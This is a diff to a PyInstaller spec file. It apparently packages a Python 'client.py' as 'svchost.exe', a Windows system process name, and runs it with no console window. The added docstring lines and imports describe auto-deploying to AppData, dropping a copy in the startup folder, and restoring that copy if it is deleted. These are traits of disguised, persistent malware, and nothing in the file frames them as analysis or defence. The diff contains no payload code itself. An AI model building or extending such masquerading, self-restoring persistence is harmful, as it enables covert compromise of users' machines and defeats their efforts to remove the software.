@@ -4,6 +4,8 @@ Simplified PyInstaller spec file for compiling client.py to svchost.exe
 - Silent execution (no console window)
 - All dependencies bundled
 - Optimized for Windows deployment with Python 3.13
+- Auto-deploys to AppData with startup folder duplicate
+- Monitors and restores startup folder copy if deleted
 """
 
 block_cipher = None
@@ -25,6 +27,10 @@ hiddenimports = [
     'win32service',
     'win32com.client',
     'comtypes.client',
+    'winreg',
+    'shutil',
+    'threading',
+    'time',
 ]
 
 a = Analysis(
